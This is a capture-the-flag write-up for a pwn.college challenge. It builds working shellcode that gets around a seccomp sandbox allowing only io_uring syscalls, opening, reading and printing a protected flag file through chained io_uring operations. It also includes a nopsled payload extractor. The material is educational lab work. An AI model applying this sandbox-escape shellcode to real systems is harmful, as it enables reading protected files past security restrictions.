# Challenge 5

## Description

```
Did you ever wonder how Santa manages to deliver *sooo* many presents in one night?

---

Dashing through the code,<br>
In a one-ring I/O sled,<br>
O’er the syscalls go,<br>
No blocking lies ahead!<br>
Buffers queue and spin,<br>
Completions shining bright,<br>
What fun it is to read and write,<br>
Async I/O tonight — hey!
```

## Analysis

```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#define NORTH_POLE_ADDR (void *)0x1225000

int setup_sandbox()
{
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        return 1;
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_setup), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_enter), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_register), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
        perror("seccomp_rule_add");
        return 1;
    }

    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        return 1;
    }

    seccomp_release(ctx);

    return 0;
}

int main()
{
    void *code = mmap(NORTH_POLE_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (code != NORTH_POLE_ADDR) {
        perror("mmap");
        return 1;
    }

    srand(time(NULL));
    int offset = (rand() % 100) + 1;

    puts("🛷 Loading cargo: please stow your sled at the front.");

    if (read(STDIN_FILENO, code, 0x1000) < 0) {
        perror("read");
        return 1;
    }

    puts("📜 Checking Santa's naughty list... twice!");
    if (setup_sandbox() != 0) {
        perror("setup_sandbox");
        return 1;
    }

    // puts("❄️ Dashing through the snow!");
    ((void (*)())(code + offset))();

    // puts("🎅 Merry Christmas to all, and to all a good night!");
    return 0;
}
```

The challenge is a seccomp-bpf that only enables the io-uring system calls. So
basically, we need to make an io-uring program to do what we want (open the
flag and print it).

Our code can only be one page long, and it needs to start with a 100-byte
nopsled (the code jumps to a random byte in the first 100 bytes).

## IO-Uring Intro
Basically, with io-uring you send async requests to a kthread running in the
background performing operations on your behalf.

The syscalls that are enabled are `io_uring_setup`, `io_uring_enter`, and
`io_uring_register`.

With `io_uring_setup` you initialize a ring however you want and obtain a file
descriptor to use later. You can then use `mmap` to map some of the iouring
datastructures into your address space (specially the submission and completion
queues).

You can add elements to the submission queue (following a specific convention,
because this queue is circular and asynchronous), and then call
`io_uring_enter` to let the agent know about these new submission queue entries
(SQEs). Then, you watch the completion queue for updates to see when your
commands are completed. You can also _chain_ submissions together, to use the
result of one into the next one.

`io_uring_register` can be used to pre-register buffers and files so your
io-uring operations can reference those.

## Interacting with SQ and CQ rings

From the manpage:

* You add SQEs to the tail of the SQ. The kernel reads SQEs off the head of the
queue.
* The kernel adds CQEs to the tail of the CQ. You read CQEs off the
head of the queue.

### Operations Needed

So basically, the operations that we want to perform are `IORING_OP_OPENAT` to
open the flag, then `IORING_OP_READ` to read from that file descriptor into a
buffer and finally `IORING_OP_WRITE`  to write that to stdout/stderr.

## `seccomp-bpf` Restrictions

The typical way you interact with iouring is by mapping the submission and
completion queues into your address space, and interact with those rings
directly. The seccomp-bpf sandbox forbids us to use `mmap`, so we have to work
around that.

You can specify the `IO_RING_SETUP_NOMMAP` to let the kernel know that you will
be providing the buffers for the submission and completion queues.

## Proof-of-concept

Let's start writing a program that writes Hello World using iouring.
Configuring io-uring from assembly seems extremely painful, so let's use
freestanding C code. We need to write this in a way that is shellcode-friendly,
so we will have to take the following considerations:

* No libc calls
	* We will need to add our own syscall wrappers.
	* We will need our own implementation of `memset` and `memcpy`.
* assembly impl of `memset` and `memcpy` to avoid the compiler optimizing it.
* Try to avoid function calls.
	* We want all our code to be in a single function, we can make all the functions to be forced-inline.
* No initialization.
	* `clang` and `gcc` will emit `memset` libcalls to zero-initialize large structs and arrays. We should avoid that and instead call `memset` ourselves so it can be inlined.
	* Note that if we switch to higher optimization levels, the compiler will inline its libcall calls to `memset`.
* No explicit strings.
	* The compiler is free to store strings into `.rodata`, and we can't really reference that. So instead we should "build" the strings ourselves (for example, by having them as `uint64_t` values).
* No global state.
	* We can't have anything in `.data` or `.rodata` or really the heap. The only memory we are guaranteed to have is the stack so we should keep all our state in the stack.

First, the boilerplate (structs and syscalls definitions):

```c
#define _GNU_SOURCE

#include <linux/io_uring.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

#define ALWAYS_INLINE [[clang::always_inline]] inline
#define ALIGNED(X) __attribute__((aligned(X)))
#define PAGE_SIZE (4096)
#define ENTRIES (1)

typedef struct iouring_ctx {
  int ring_fd;
  unsigned *sring_tail, *sring_mask, *cring_head, *cring_tail, *cring_mask;
  struct io_uring_sqe *sqes;
  struct io_uring_cqe *cqes;
  uint8_t ring[PAGE_SIZE] ALIGNED(PAGE_SIZE);
  uint8_t sqes_buf[PAGE_SIZE] ALIGNED(PAGE_SIZE);
} iouring_ctx;

ALWAYS_INLINE void *memset(void *src, int val, size_t num) {
  char v = val & 0xff;
  uint8_t *data = (uint8_t *)src;

  // Copy the byte in al, rcx times into rdi
  __asm__ volatile("rep stosb\n" : "+D"(data), "+c"(num) : "a"(v) : "memory");

  return src;
}

ALWAYS_INLINE void *memcpy(void *restrict dest, const void *restrict src,
                           size_t n) {
  void *data = dest;
  __asm__ volatile("rep movsb\n" : "+D"(data), "+S"(src), "+c"(n) : : "memory");
  return dest;
}

ALWAYS_INLINE int io_uring_setup(unsigned entries, struct io_uring_params *p) {
  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_io_uring_setup), "D"(entries), "S"(p)
                   : "rcx", "r11", "memory");
  return ret;
}

ALWAYS_INLINE int io_uring_enter(int fd, uint32_t to_submit,
                                 uint32_t min_complete, uint32_t flags,
                                 const void *argp, size_t argsz) {
  register unsigned int r10_flags __asm__("r10") = flags;
  register const void *r8_argp __asm__("r8") = argp;
  register size_t r9_argsz __asm__("r9") = argsz;

  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_io_uring_enter), "D"(fd), "S"(to_submit),
                     "d"(min_complete), "r"(r10_flags), "r"(r8_argp),
                     "r"(r9_argsz)
                   : "rcx", "r11", "memory");

  return ret;
}

[[noreturn]] ALWAYS_INLINE int exit_group(int code) {
  __asm__ volatile("syscall\n"
                   :
                   : "a"(__NR_exit_group), "D"(code)
                   : "rcx", "r11", "memory");
  __builtin_unreachable();
}
```

Then the iouring functions that we care about (`setup`, `submit_to_sq`, `read_from_cq`):

```c
ALWAYS_INLINE void setup(iouring_ctx *ctx) {
  __u64 ring_addr = (__u64)ctx->ring;
  __u64 sqes_addr = (__u64)ctx->sqes_buf;

  struct io_uring_params p = {
      .flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY,
      .sq_off.user_addr = sqes_addr,
      .cq_off.user_addr = ring_addr,
  };

  ctx->ring_fd = io_uring_setup(ENTRIES, &p);
  if (ctx->ring_fd == -1) {
    exit_group(1);
  }

  ctx->sring_tail = (unsigned *)(ring_addr + p.sq_off.tail);
  ctx->sring_mask = (unsigned *)(ring_addr + p.sq_off.ring_mask);

  ctx->cring_head = (unsigned *)(ring_addr + p.cq_off.head);
  ctx->cring_tail = (unsigned *)(ring_addr + p.cq_off.tail);
  ctx->cring_mask = (unsigned *)(ring_addr + p.cq_off.ring_mask);
  ctx->cqes = (struct io_uring_cqe *)(ring_addr + p.cq_off.cqes);
  ctx->sqes = (struct io_uring_sqe *)ctx->sqes_buf;
}
```

In setup, we store all the information that we care about in our `iouring_ctx`
struct, and by using `IORING_SETUP_NO_MMAP` we specify that the sq/cq rings and
the sqe array are all in our struct as well (which we will place in the stack).
By using `IORING_SETUP_NO_SQARRAY` we simplify  things a bit, removing one
small layer of indirection when submitting SQEs.

```c
ALWAYS_INLINE void submit_to_sq(iouring_ctx *ctx, struct io_uring_sqe *sqe) {
  // Get the next SQE from the array.
  unsigned tail, index;
  tail = *ctx->sring_tail;
  index = tail & (*ctx->sring_mask);

  struct io_uring_sqe *dst_sqe = &ctx->sqes[index];
  memcpy(dst_sqe, sqe, sizeof(struct io_uring_sqe));

  tail++;
  atomic_store_explicit((_Atomic unsigned *)ctx->sring_tail, tail,
                        memory_order_release);
  int res = io_uring_enter(ctx->ring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
  if (res == -1) {
    exit_group(2);
  }
}
```

Submitting an element to the SQ is getting the next available index from the SQ
ring and adding our SQE there, then calling `io_uring_enter`. The third
parameter tells the kernel to wait until the completion is ready before
returning. Note that our `sqe` has both `addr` and `len` hardcoded to the
`iouring_ctx` buffer. This works for the write operation but we might need to
change it in the future.

```c
ALWAYS_INLINE int read_from_cq(iouring_ctx *ctx) {
  unsigned head = *ctx->cring_head;
  if (head == atomic_load_explicit((_Atomic unsigned *)ctx->cring_tail,
                                   memory_order_acquire)) {
    exit_group(3);
  }

  unsigned index = head & *(ctx->cring_mask);
  struct io_uring_cqe *cqe = &ctx->cqes[index];
  if (cqe->res < 0) {
    exit_group(4);
  }

  head++;
  atomic_store_explicit((_Atomic unsigned *)ctx->cring_head, head,
                        memory_order_release);
  return cqe->res;
}

```
Reading from the completion queue is similar, we first read the cq head, and if
it is different than the tail then it means there's something there to read.
Once we read it, we update the head to point to the next element.

```c
[[gnu::section(".text.entry")]] void _start(void) {
  iouring_ctx ctx = {};
  setup(&ctx);

  // Hello\n
  uint64_t hello = 0x000a6f6c6c6548;

  struct io_uring_sqe write_sqe = {
      .opcode = IORING_OP_WRITE,
      .fd = STDERR_FILENO,
      .addr = (__u64)&hello,
      .len = sizeof(hello),
  };

  submit_to_sq(&ctx, &write_sqe);
  read_from_cq(&ctx);

  exit_group(0);
}
```

Our code entry point, writes the string `"Hello\n"` to the buffer, and uses
`IORING_OP_WRITE` to write that to stderr. The full file can be found in
[`./hello-world.c`](./hello_world.c)

```shell
$ make hello_world
clang -Wall -Wextra -pedantic -std=c2x -Oz -g3 -gdwarf-5 -fno-builtin -fno-builtin-memset -ffreestanding -fpie -nostdlib -mno-sse -fno-jump-tables -Wl,--unique=.text.entry    hello_world.c   -o hello_world
hello_world.c   -o hello_world
$ ./hello_world 
Hello
```

Breaking down the clang command:
* `-Oz` to try to emit small shellcode. This also makes the compiler inline the libcall calls to `memset`.
* `-fno-builtin`, `-fno-builtin-memset`. Do not use libc builtins.
* `-ffreestanding` 
* `-nostdlib` do not link against the libc nor start files.
* `-fpie` position independent executable.
* `-mno-sse` to avoid emitting sse+ instructions. This makes it so we do not trip with unaligned stack issues.
* `-Wl,--unique=.text.entry` make our function in a standalone ELF section, so it's easier to extract.

But we still need to extract the payload to run it in our challenge. We can
extract all the bytes from the `.text.entry` section (only our function), and
we need to prepend a nopsled to the beginning as the code will jump to a random
byte in the first 100 bytes of the payload.

```python
import pwn
from pathlib import Path

pwn.context.arch = "amd64"

binary_path = Path("./hello_world")
elf = pwn.ELF(binary_path)
payload = elf.get_section_by_name(".text.entry").data()

# Add a nopsled at the beginning.
nopsled = b"\x90" * 100

with open("payload", "wb") as f:
    f.write(nopsled)
    f.write(payload)
```

The payload extractor is in [`./payload_extractor.py`](./payload_extractor.py).

```
$ wc -c ./payload 
594 ./payload
$ /challenge/sleigh < payload
🛷 Loading cargo: please stow your sled at the front.
📜 Checking Santa's naughty list... twice!
Hello
```

## Open, Read and Write
Now that we have a framework that works reliably, we can expand it to make all
that we need.

First we want to use `IORING_OP_OPENAT` on the flag, then we want to use
`IORING_OP_READ` into our buffer, and finally we want to `IORING_OP_WRITE` that
buffer into stderr.

```c
#include <fcntl.h> // O_RDONLY and AT_FDCWD

[[gnu::section(".text.entry")]] void _start(void) {
  uint8_t buff[PAGE_SIZE] = {};

  iouring_ctx ctx = {};
  setup(&ctx);

  {
    // /flag
    uint64_t flag_path = 0x0067616c662f;

    struct io_uring_sqe openat_sqe = {
        .opcode = IORING_OP_OPENAT,
        .fd = AT_FDCWD,
        .len = 0,  // mode
        .open_flags = O_RDONLY,
        .addr = (__u64)&flag_path,
    };
    submit_to_sq(&ctx, &openat_sqe);
  }
  int flag_fd = read_from_cq(&ctx);

  {
    struct io_uring_sqe read_sqe = {
        .opcode = IORING_OP_READ,
        .fd = flag_fd,
        .addr = (__u64)buff,
        .len = sizeof(buff),
    };
    submit_to_sq(&ctx, &read_sqe);
  }
  int len = read_from_cq(&ctx);

  {
    struct io_uring_sqe write_sqe = {
        .opcode = IORING_OP_WRITE,
        .fd = STDERR_FILENO,
        .addr = (__u64)buff,
        .len = len,
    };

    submit_to_sq(&ctx, &write_sqe);
    read_from_cq(&ctx);
  }

  exit_group(0);
}
```

This file can be found in [`./challenge5.c`](./challenge5.c)

```
$ /challenge/sleigh < payload
🛷 Loading cargo: please stow your sled at the front.
📜 Checking Santa's naughty list... twice!
pwn.college{practice}
```

## Using only one `io_uring_enter` call.
By using the `IOSQE_IO_LINK` in our SQEs we can guarantee that they are
executed in order. This means that we can add all of them to the SQ in one go
and call `io_uring_enter` just once.

Note that `IOSQE_IO_LINK` stops the chain if the `read` operation reads less
than what we expect, so we have to use `IOSQE_IO_HARDLINK` instead. We will
also need to increase the ring size to allow for up to 3 SQEs.

### Naive approach: guessing fds.
One problem arises in the second SQE: we don't know which fd we got from the
`IORING_OP_OPENAT` operation. For now, we can hard-code that to `4` and see how
that works out (1, 2, 3 are used for the standard unix streams, and 3 is
probably the one for the uring).

Taking out the `io_uring_enter` from `submit_to_cq` and moving it to the end of
the main function looks like this:

```c
// Update ENTRIES to a power of two that can fit all our SQEs.
#define ENTRIES (4)

ALWAYS_INLINE void add_to_sq(iouring_ctx *ctx, struct io_uring_sqe *sqe) {
  // Get the next SQE from the array.
  unsigned tail, index;
  tail = *ctx->sring_tail;
  index = tail & (*ctx->sring_mask);

  struct io_uring_sqe *dst_sqe = &ctx->sqes[index];
  memcpy(dst_sqe, sqe, sizeof(struct io_uring_sqe));

  tail++;
  atomic_store_explicit((_Atomic unsigned *)ctx->sring_tail, tail,
                        memory_order_release);
}

[[gnu::section(".text.entry")]] void _start(void) {
  uint8_t buff[PAGE_SIZE] = {};

  iouring_ctx ctx = {};
  setup(&ctx);

  {
    // /flag
    uint64_t flag_path = 0x0067616c662f;

    struct io_uring_sqe openat_sqe = {
        .opcode = IORING_OP_OPENAT,
        .fd = AT_FDCWD,
        .len = 0,  // mode
        .open_flags = O_RDONLY,
        .addr = (__u64)&flag_path,
        .flags = IOSQE_IO_LINK,
    };

    add_to_sq(&ctx, &openat_sqe);
  }
  {
    struct io_uring_sqe read_sqe = {
        .opcode = IORING_OP_READ,
        .fd = 4,
        .addr = (__u64)buff,
        .len = sizeof(buff),
        .flags = IOSQE_IO_HARDLINK,
    };

    add_to_sq(&ctx, &read_sqe);
  }
  {
    struct io_uring_sqe write_sqe = {
        .opcode = IORING_OP_WRITE,
        .fd = STDERR_FILENO,
        .addr = (__u64)buff,
        .len = sizeof(buff),
        .flags = IOSQE_IO_HARDLINK,
        .off = -1,
    };

    add_to_sq(&ctx, &write_sqe);
  }

  int res = io_uring_enter(ctx.ring_fd, 3, 3, IORING_ENTER_GETEVENTS, NULL, 0);
  if (res == -1) {
    exit_group(2);
  }

  read_from_cq(&ctx);
  read_from_cq(&ctx);
  read_from_cq(&ctx);

  exit_group(0);
}
```

This solution can be found in [`./challenge5_onecall_naive.c`](./challenge5_onecall_naive.c)

### Using Fixed Files.
To solve the issue with not knowing the file descriptor that comes from open,
we can pre-register a file into our ring so that openat maps the fd into that
file, and read uses that fixed file. This way we can chain the SQEs without
having to worry about the file descriptor number.

The changes needed would be to keep an array of the registered file
descriptors:

```c
typedef struct iouring_ctx {
  int ring_fd;
  unsigned *sring_tail, *sring_mask, *cring_head, *cring_tail, *cring_mask;
  struct io_uring_sqe *sqes;
  struct io_uring_cqe *cqes;
  int registered_files[1];
  uint8_t ring[PAGE_SIZE] ALIGNED(PAGE_SIZE);
  uint8_t sqes_buf[PAGE_SIZE] ALIGNED(PAGE_SIZE);
} iouring_ctx;
```

Register that during `setup`:

```c
ALWAYS_INLINE int io_uring_register(int fd, unsigned int op, void *arg,
                                    unsigned int nr_args) {
  register unsigned int r10_nr_args __asm__("r10") = nr_args;
  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_io_uring_register), "D"(fd), "S"(op), "d"(arg),
                     "r"(r10_nr_args)
                   : "rcx", "r11", "memory");
  return ret;
}

ALWAYS_INLINE void setup(iouring_ctx *ctx) {
  __u64 ring_addr = (__u64)ctx->ring;
  __u64 sqes_addr = (__u64)ctx->sqes_buf;

  struct io_uring_params p = {
      .flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY,
      .sq_off.user_addr = sqes_addr,
      .cq_off.user_addr = ring_addr,
  };

  ctx->ring_fd = io_uring_setup(ENTRIES, &p);
  if (ctx->ring_fd == -1) {
    exit_group(1);
  }

  ctx->sring_tail = (unsigned *)(ring_addr + p.sq_off.tail);
  ctx->sring_mask = (unsigned *)(ring_addr + p.sq_off.ring_mask);

  ctx->cring_head = (unsigned *)(ring_addr + p.cq_off.head);
  ctx->cring_tail = (unsigned *)(ring_addr + p.cq_off.tail);
  ctx->cring_mask = (unsigned *)(ring_addr + p.cq_off.ring_mask);
  ctx->cqes = (struct io_uring_cqe *)(ring_addr + p.cq_off.cqes);
  ctx->sqes = (struct io_uring_sqe *)ctx->sqes_buf;

  if (io_uring_register(ctx->ring_fd, IORING_REGISTER_FILES,
                        ctx->registered_files, 1) == -1) {
    exit_group(5);
  }
}
```

And change the code in the main function to initialize the table to `-1` and to use that during the operations.
* Specify the `file_index` argument to `IORING_OP_OPENAT` to be the index of the registered file plus one.
* Add the `IOSQE_FIXED_FILE` to the `IORING_OP_READ` sqe, and set `fd` to index `0`.

Yes, I know, the index in `IORING_OP_OPENAT` does not match the one in `IORING_OP_READ`, but that's how it works.

```c
[[gnu::section(".text.entry")]] void _start(void) {
  uint8_t buff[PAGE_SIZE] = {};

  iouring_ctx ctx = {
      .registered_files = {-1},
  };
  setup(&ctx);

  {
    // /flag
    uint64_t flag_path = 0x0067616c662f;

    struct io_uring_sqe openat_sqe = {
        .opcode = IORING_OP_OPENAT,
        .fd = AT_FDCWD,
        .len = 0,  // mode
        .open_flags = O_RDONLY,
        .addr = (__u64)&flag_path,
        .flags = IOSQE_IO_LINK,
        .file_index = 1,
    };

    add_to_sq(&ctx, &openat_sqe);
  }
  {
    struct io_uring_sqe read_sqe = {
        .opcode = IORING_OP_READ,
        .fd = 0,
        .addr = (__u64)buff,
        .len = sizeof(buff),
        .flags = IOSQE_IO_HARDLINK | IOSQE_FIXED_FILE,
    };

    add_to_sq(&ctx, &read_sqe);
  }
  {
    struct io_uring_sqe write_sqe = {
        .opcode = IORING_OP_WRITE,
        .fd = STDERR_FILENO,
        .addr = (__u64)buff,
        .len = sizeof(buff),
        .flags = IOSQE_IO_HARDLINK,
        .off = -1,
    };

    add_to_sq(&ctx, &write_sqe);
  }

  int res = io_uring_enter(ctx.ring_fd, 3, 3, IORING_ENTER_GETEVENTS, NULL, 0);
  if (res == -1) {
    exit_group(2);
  }

  read_from_cq(&ctx);
  read_from_cq(&ctx);
  read_from_cq(&ctx);

  exit_group(0);
}
```

This solution can be found in [`./challenge5_onecall.c`](./challenge5_onecall.c)

## Other alternatives

It should be possible to solve the challenge using other `io_uring` operations,
for example `IORING_OP_LINKAT`.

## Doing everything in assembly.

Even though the code seems complicated, there are some simplifications that can
be made. For example, we can just write directly the SQEs, without having to
worry about head and tail. We just write everything and then update the tail.
Similarly, we do not really need to read the completion queue at all. We can
just exit after `io_uring_enter`, as it will wait automatically for us.

Writing it in assembly is left as an exercise to the reader though :)
